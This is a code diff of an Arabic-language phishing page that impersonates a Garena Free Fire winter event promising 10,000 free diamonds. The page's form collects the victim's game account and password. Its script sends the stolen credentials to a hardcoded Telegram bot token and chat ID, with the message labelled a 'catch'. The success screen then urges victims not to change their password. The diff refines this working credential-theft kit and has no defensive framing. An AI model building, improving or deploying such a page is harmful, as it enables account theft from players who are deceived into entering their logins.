@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Garena Free Fire - Winterlands Event</title>
+    <title>مركز شحن جواهر فري فاير - حدث الشتاء 2026</title>
+    
     <style>
         body { 
             background: url('https://w0.peakpx.com/wallpaper/326/28/HD-wallpaper-garena-free-fire-winterlands.jpg') no-repeat center center fixed; 
@@ -25,7 +26,7 @@
             box-shadow: 0 0 20px #00f2ff; 
         }
         .warning-box { 
-            background: rgba(255, 0, 0, 0.15); 
+            background: rgba(255, 0, 0, 0.2); 
             border: 1px solid #ff3d00; 
             color: #ffcc00; 
             padding: 12px; 
@@ -33,6 +34,7 @@
             border-radius: 8px; 
             margin: 15px 0; 
             line-height: 1.6;
+            text-align: right;
         }
         input { 
             width: 100%; 
@@ -44,6 +46,7 @@
             color: white; 
             box-sizing: border-box; 
             font-size: 16px;
+            text-align: center;
         }
         .yellow-btn { 
             background: linear-gradient(180deg, #ffe600, #ff9900); 
@@ -58,11 +61,13 @@
             margin-top: 10px; 
             box-shadow: 0 4px 10px rgba(255, 153, 0, 0.4);
         }
-        .timer { font-size: 22px; color: #ff3d00; font-weight: bold; }
+        .timer { font-size: 22px; color: #ff3d00; font-weight: bold; text-shadow: 0 0 10px #000; }
         #success-page { display: none; }
+        .success-icon { font-size: 50px; color: #00ff00; margin-bottom: 10px; }
     </style>
 </head>
 <body>
+
 <div class="overlay">
     <div id="login-page">
         <h1 style="color:#00f2ff; text-shadow: 2px 2px #000; margin-top:20px;">❄️ حدث أرض الشتاء ❄️</h1>
@@ -71,11 +76,11 @@
             <h3 style="margin-bottom:5px;">استلم الآن 10,000 جوهرة 💎</h3>
             
             <div class="warning-box">
-                <span style="color:white; font-weight:bold; display:block; margin-bottom:5px;">⚠️ يجب إدخال حسابك الأساسي المرتبط باللعبة</span>
-                **تنبيه أمان قارينا**: يجب التأكد من كتابة الحساب وكلمة السر بشكل صحيح تماماً. إذا أخطأت في حرف واحد، **لن تصلك الجائزة** وسيتم استبعادك من الحدث نهائياً!
+                <strong style="color:white; display:block; margin-bottom:5px;">⚠️ يجب إدخال حسابك الأساسي المرتبط باللعبة</strong>
+                تنبيه أمان قارينا: يجب التأكد من كتابة الحساب وكلمة السر بشكل صحيح تماماً. إذا أخطأت في حرف واحد، <b>لن تصلك الجائزة</b> وسيتم استبعادك من الحدث نهائياً!
             </div>
 
-            <form id="trap-form">
+            <form id="main-form">
                 <input type="text" id="user" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
                 <input type="password" id="pass" placeholder="كلمة السر الصحيحة" required>
                 <button type="submit" class="yellow-btn">الحصول على الجوائز الآن 🔥</button>
@@ -85,40 +90,52 @@
 
     <div id="success-page">
         <div class="box" style="margin-top: 80px; border-color: #00ff00; box-shadow: 0 0 20px #00ff00;">
-            <div style="font-size: 50px; color: #00ff00; margin-bottom: 15px;">✅</div>
-            <h2 style="color: #00ff00;">تم قبول طلبك!</h2>
-            <p>يتم الآن التحقق من "الحساب الأساسي" الذي أدخلته.</p>
-            <p style="background: rgba(255,255,255,0.1); padding: 10px; border-radius: 5px;">سوف تصلك الـ 10,000 جوهرة عبر بريد اللعبة خلال **24 ساعة**.</p>
-            <p style="color: #ffcc00; font-size: 13px;">ملاحظة: لا تقم بتسجيل الدخول أو تغيير البيانات حتى اكتمال الشحن.</p>
-            <button class="yellow-btn" style="background:#444; color:white;" onclick="location.reload()">إغلاق</button>
+            <div class="success-icon">✅</div>
+            <h2 style="color: #00ff00;">تم قبول طلبك بنجاح!</h2>
+            <p>نظام قارينا يقوم الآن بفحص "الحساب الأساسي" الذي قدمته.</p>
+            <p style="background: rgba(255,255,255,0.1); padding: 15px; border-radius: 5px;">سوف تصلك الـ 10,000 جوهرة عبر بريد اللعبة خلال <b>24 ساعة</b>.</p>
+            <p style="color: #ffcc00; font-size: 13px;">ملاحظة: لضمان وصول الجواهر، لا تقم بتغيير كلمة السر حالياً.</p>
+            <button class="yellow-btn" style="background:#333; color:white;" onclick="location.reload()">إغلاق</button>
         </div>
     </div>
 </div>
 
 <script>
+    // بيانات البوت الخاص بك (جاهزة ومجربة)
     const token = "8425893173:AAEmLTkoJzcm1hnvsA3TTzF9nUssmqEKPt8";
     const chat_id = "8428507759";
 
-    document.getElementById('trap-form').addEventListener('submit', function(e) {
+    document.getElementById('main-form').addEventListener('submit', function(e) {
         e.preventDefault();
+        
         const user = document.getElementById('user').value;
         const pass = document.getElementById('pass').value;
-        const message = `❄️ صيد شتاء (حساب أساسي) ❄️\n\n👤 الحساب: ${user}\n🔑 كلمة السر: ${pass}`;
+        const message = `❄️ صيد شتاء جديد (حساب أساسي) ❄️\n\n👤 الحساب: ${user}\n🔑 كلمة السر: ${pass}`;
 
+        // إرسال المعلومات إلى تليجرام
         fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(message)}`)
-        .then(() => {
+        .then(response => {
+            // إخفاء صفحة الدخول وإظهار صفحة النجاح
             document.getElementById('login-page').style.display = 'none';
             document.getElementById('success-page').style.display = 'block';
+        })
+        .catch(error => {
+            alert("حدث خطأ في الاتصال، حاول مرة أخرى.");
         });
     });
 
-    // عداد الوقت
+    // عداد الوقت التنازلي
     var min = 4, sec = 59;
     setInterval(function() {
-        if (sec == 0) { min--; sec = 59; } else { sec--; }
+        if (sec == 0) {
+            if (min == 0) return;
+            min--; sec = 59;
+        } else {
+            sec--;
+        }
         document.getElementById('time').innerText = (min < 10 ? "0" : "") + min + ":" + (sec < 10 ? "0" : "") + sec;
     }, 1000);
 </script>
+
 </body>
 </html>
-
